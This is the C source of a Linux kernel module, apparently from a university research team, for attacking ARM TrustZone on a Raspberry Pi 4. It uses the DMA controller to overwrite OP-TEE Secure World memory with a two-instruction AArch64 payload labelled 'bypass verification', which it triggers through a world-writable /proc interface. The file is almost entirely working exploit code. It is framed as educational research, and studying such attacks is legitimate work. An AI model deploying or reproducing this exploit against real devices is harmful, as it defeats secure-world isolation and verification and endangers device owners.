/*
 * dma_attack.ko - Kernel Module for TrustZone DMA Attack
 * 
 * This kernel module provides a controlled interface for performing
 * DMA operations targeting Secure World memory on Raspberry Pi 4.
 *
 * Usage:
 *   insmod dma_attack.ko
 *   echo "target_addr=0x3E000000 payload_size=8" > /proc/dma_attack
 *   cat /proc/dma_attack
 *   rmmod dma_attack
 *
 * Copyright (C) 2025 - Educational/Research Purposes Only
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/io.h>
#include <linux/dma-mapping.h>
#include <linux/platform_device.h>
#include <linux/of.h>
#include <linux/of_address.h>
#include <linux/slab.h>
#include <linux/delay.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ECE595 Research Team");
MODULE_DESCRIPTION("DMA Attack Module for ARM TrustZone Research");
MODULE_VERSION("1.0");

#define PROC_NAME "dma_attack"
#define BCM2711_PERI_BASE 0xFE000000
#define DMA_BASE_OFFSET   0x007000
#define DMA_CHANNEL       7  // Use channel 7-10 (safer than 0-6)

/* DMA Control Block - aligned to 256 bytes as required by BCM2711 */
struct dma_cb {
    u32 ti;          /* Transfer Information */
    u32 source_ad;   /* Source Address */
    u32 dest_ad;     /* Destination Address */
    u32 txfr_len;    /* Transfer Length */
    u32 stride;      /* 2D Stride */
    u32 nextconbk;   /* Next Control Block */
    u32 reserved[2];
} __attribute__((aligned(256)));

/* Attack State */
struct dma_attack_state {
    void __iomem *dma_base;
    struct dma_cb *control_block;
    dma_addr_t cb_dma_handle;
    void *payload_buffer;
    dma_addr_t payload_dma_handle;
    u32 target_address;
    size_t payload_size;
    struct device *dev;
    bool initialized;
};

static struct dma_attack_state attack_state = {
    .initialized = false,
};

/* AArch64 payload: MOV X0, #0; RET (bypass verification) */
static u32 default_payload[] = {
    0xD2800000,  /* MOV X0, #0 */
    0xD65F03C0   /* RET */
};

/*
 * Initialize DMA controller and map registers
 */
static int dma_attack_init_hardware(void)
{
    phys_addr_t dma_phys = BCM2711_PERI_BASE + DMA_BASE_OFFSET;
    
    pr_info("dma_attack: Mapping DMA controller at 0x%llx\n", 
            (unsigned long long)dma_phys);
    
    attack_state.dma_base = ioremap(dma_phys, 0x1000);
    if (!attack_state.dma_base) {
        pr_err("dma_attack: Failed to map DMA controller\n");
        return -ENOMEM;
    }
    
    /* Reset DMA channel */
    iowrite32(1 << 31, attack_state.dma_base + (DMA_CHANNEL * 0x100));
    udelay(100);
    
    pr_info("dma_attack: DMA controller mapped and reset\n");
    return 0;
}

/*
 * Allocate DMA-capable memory for control block and payload
 */
static int dma_attack_alloc_buffers(struct device *dev)
{
    /* Allocate control block with proper alignment */
    attack_state.control_block = dma_alloc_coherent(dev,
                                                     sizeof(struct dma_cb),
                                                     &attack_state.cb_dma_handle,
                                                     GFP_KERNEL);
    if (!attack_state.control_block) {
        pr_err("dma_attack: Failed to allocate control block\n");
        return -ENOMEM;
    }
    
    /* Allocate payload buffer */
    attack_state.payload_size = PAGE_SIZE;
    attack_state.payload_buffer = dma_alloc_coherent(dev,
                                                      attack_state.payload_size,
                                                      &attack_state.payload_dma_handle,
                                                      GFP_KERNEL);
    if (!attack_state.payload_buffer) {
        pr_err("dma_attack: Failed to allocate payload buffer\n");
        dma_free_coherent(dev, sizeof(struct dma_cb),
                         attack_state.control_block,
                         attack_state.cb_dma_handle);
        return -ENOMEM;
    }
    
    /* Initialize with default payload */
    memcpy(attack_state.payload_buffer, default_payload, sizeof(default_payload));
    
    pr_info("dma_attack: Allocated buffers - CB: 0x%llx, Payload: 0x%llx\n",
            (unsigned long long)attack_state.cb_dma_handle,
            (unsigned long long)attack_state.payload_dma_handle);
    
    return 0;
}

/*
 * Perform DMA transfer to target address
 */
static int dma_attack_execute(u32 target_addr, size_t length)
{
    struct dma_cb *cb = attack_state.control_block;
    void __iomem *dma_chan = attack_state.dma_base + (DMA_CHANNEL * 0x100);
    u32 cs;
    int timeout = 1000;
    
    if (length > attack_state.payload_size) {
        pr_err("dma_attack: Payload too large (%zu > %zu)\n",
               length, attack_state.payload_size);
        return -EINVAL;
    }
    
    pr_info("dma_attack: Executing DMA transfer to 0x%08x (%zu bytes)\n",
            target_addr, length);
    
    /* Configure control block */
    memset(cb, 0, sizeof(*cb));
    cb->ti = (1 << 26) |  /* No wide bursts */
             (1 << 8)  |  /* Dest increment */
             (1 << 4)  |  /* Src increment */
             (1 << 0);    /* Interrupt enable */
    
    cb->source_ad = (u32)attack_state.payload_dma_handle;
    cb->dest_ad = target_addr;
    cb->txfr_len = length;
    cb->stride = 0;
    cb->nextconbk = 0;
    
    /* Ensure control block is written to memory */
    wmb();
    
    /* Program DMA controller */
    iowrite32((u32)attack_state.cb_dma_handle, dma_chan + 0x04); /* CONBLK_AD */
    
    /* Start transfer */
    iowrite32((1 << 0) | (7 << 16), dma_chan); /* ACTIVE | PRIORITY=7 */
    
    /* Wait for completion */
    while (timeout-- > 0) {
        cs = ioread32(dma_chan);
        
        if (cs & (1 << 1)) {  /* END flag */
            pr_info("dma_attack: Transfer completed successfully\n");
            /* Clear END flag */
            iowrite32(1 << 1, dma_chan);
            return 0;
        }
        
        if (cs & (1 << 2)) {  /* ERROR flag */
            u32 debug = ioread32(dma_chan + 0x20); /* DEBUG register */
            pr_err("dma_attack: DMA error! CS=0x%08x DEBUG=0x%08x\n", cs, debug);
            return -EIO;
        }
        
        udelay(10);
    }
    
    pr_err("dma_attack: DMA transfer timeout\n");
    return -ETIMEDOUT;
}

/*
 * Parse device tree to find OP-TEE secure memory regions
 */
static int dma_attack_find_optee_memory(void)
{
    struct device_node *node;
    const __be32 *reg;
    u64 base, size;
    int len;
    
    /* Look for OP-TEE reserved memory node */
    node = of_find_node_by_path("/reserved-memory");
    if (!node) {
        pr_warn("dma_attack: No /reserved-memory node found\n");
        return -ENOENT;
    }
    
    for_each_child_of_node(node, node) {
        if (of_node_name_eq(node, "optee") || 
            of_device_is_compatible(node, "optee,reservedmem")) {
            
            reg = of_get_property(node, "reg", &len);
            if (reg && len >= 16) {
                base = of_read_number(reg, 2);
                size = of_read_number(reg + 2, 2);
                
                pr_info("dma_attack: Found OP-TEE memory: 0x%llx - 0x%llx (%llu MB)\n",
                        base, base + size, size / (1024 * 1024));
                
                attack_state.target_address = (u32)base;
                of_node_put(node);
                return 0;
            }
        }
    }
    
    pr_warn("dma_attack: OP-TEE memory region not found in device tree\n");
    return -ENOENT;
}

/*
 * /proc file read handler
 */
static ssize_t proc_read(struct file *file, char __user *ubuf, 
                        size_t count, loff_t *ppos)
{
    char buf[512];
    int len;
    
    if (*ppos > 0)
        return 0;
    
    len = snprintf(buf, sizeof(buf),
                   "DMA Attack Module Status\n"
                   "========================\n"
                   "Initialized: %s\n"
                   "DMA Base: %p\n"
                   "Control Block: 0x%llx (virt: %p)\n"
                   "Payload Buffer: 0x%llx (virt: %p)\n"
                   "Target Address: 0x%08x\n"
                   "Payload Size: %zu bytes\n"
                   "\nCommands:\n"
                   "  echo \"target=0xADDRESS\" > /proc/" PROC_NAME "\n"
                   "  echo \"execute\" > /proc/" PROC_NAME "\n"
                   "  echo \"payload=HEXBYTES\" > /proc/" PROC_NAME "\n",
                   attack_state.initialized ? "yes" : "no",
                   attack_state.dma_base,
                   (unsigned long long)attack_state.cb_dma_handle,
                   attack_state.control_block,
                   (unsigned long long)attack_state.payload_dma_handle,
                   attack_state.payload_buffer,
                   attack_state.target_address,
                   attack_state.payload_size);
    
    if (copy_to_user(ubuf, buf, len))
        return -EFAULT;
    
    *ppos = len;
    return len;
}

/*
 * /proc file write handler
 */
static ssize_t proc_write(struct file *file, const char __user *ubuf,
                         size_t count, loff_t *ppos)
{
    char buf[256];
    unsigned long target;
    int ret;
    
    if (count >= sizeof(buf))
        return -EINVAL;
    
    if (copy_from_user(buf, ubuf, count))
        return -EFAULT;
    
    buf[count] = '\0';
    
    /* Parse command */
    if (sscanf(buf, "target=%lx", &target) == 1) {
        attack_state.target_address = (u32)target;
        pr_info("dma_attack: Target address set to 0x%08x\n", 
                attack_state.target_address);
        
    } else if (strncmp(buf, "execute", 7) == 0) {
        if (!attack_state.initialized) {
            pr_err("dma_attack: Not initialized\n");
            return -EINVAL;
        }
        
        ret = dma_attack_execute(attack_state.target_address, 
                                sizeof(default_payload));
        if (ret < 0)
            return ret;
            
    } else if (strncmp(buf, "scan", 4) == 0) {
        dma_attack_find_optee_memory();
        
    } else {
        pr_err("dma_attack: Unknown command\n");
        return -EINVAL;
    }
    
    return count;
}

static const struct proc_ops proc_fops = {
    .proc_read = proc_read,
    .proc_write = proc_write,
};

/*
 * Module initialization
 */
static int __init dma_attack_init(void)
{
    struct proc_dir_entry *proc_entry;
    int ret;
    
    pr_info("dma_attack: Initializing ARM TrustZone DMA Attack Module\n");
    
    /* Create a dummy platform device for DMA API */
    attack_state.dev = kzalloc(sizeof(struct device), GFP_KERNEL);
    if (!attack_state.dev)
        return -ENOMEM;
    
    device_initialize(attack_state.dev);
    dev_set_name(attack_state.dev, "dma_attack");
    
    /* Set DMA mask */
    ret = dma_set_mask_and_coherent(attack_state.dev, DMA_BIT_MASK(32));
    if (ret) {
        pr_err("dma_attack: Failed to set DMA mask\n");
        goto err_device;
    }
    
    /* Initialize hardware */
    ret = dma_attack_init_hardware();
    if (ret)
        goto err_device;
    
    /* Allocate DMA buffers */
    ret = dma_attack_alloc_buffers(attack_state.dev);
    if (ret)
        goto err_unmap;
    
    /* Try to find OP-TEE memory in device tree */
    dma_attack_find_optee_memory();
    
    /* Create /proc entry */
    proc_entry = proc_create(PROC_NAME, 0666, NULL, &proc_fops);
    if (!proc_entry) {
        pr_err("dma_attack: Failed to create /proc entry\n");
        ret = -ENOMEM;
        goto err_free_buffers;
    }
    
    attack_state.initialized = true;
    pr_info("dma_attack: Module loaded successfully\n");
    pr_info("dma_attack: Interface available at /proc/%s\n", PROC_NAME);
    
    return 0;

err_free_buffers:
    dma_free_coherent(attack_state.dev, sizeof(struct dma_cb),
                     attack_state.control_block,
                     attack_state.cb_dma_handle);
    dma_free_coherent(attack_state.dev, attack_state.payload_size,
                     attack_state.payload_buffer,
                     attack_state.payload_dma_handle);
err_unmap:
    iounmap(attack_state.dma_base);
err_device:
    put_device(attack_state.dev);
    kfree(attack_state.dev);
    return ret;
}

/*
 * Module cleanup
 */
static void __exit dma_attack_exit(void)
{
    pr_info("dma_attack: Cleaning up\n");
    
    remove_proc_entry(PROC_NAME, NULL);
    
    if (attack_state.control_block) {
        dma_free_coherent(attack_state.dev, sizeof(struct dma_cb),
                         attack_state.control_block,
                         attack_state.cb_dma_handle);
    }
    
    if (attack_state.payload_buffer) {
        dma_free_coherent(attack_state.dev, attack_state.payload_size,
                         attack_state.payload_buffer,
                         attack_state.payload_dma_handle);
    }
    
    if (attack_state.dma_base)
        iounmap(attack_state.dma_base);
    
    if (attack_state.dev) {
        put_device(attack_state.dev);
        kfree(attack_state.dev);
    }
    
    pr_info("dma_attack: Module unloaded\n");
}

module_init(dma_attack_init);
module_exit(dma_attack_exit);
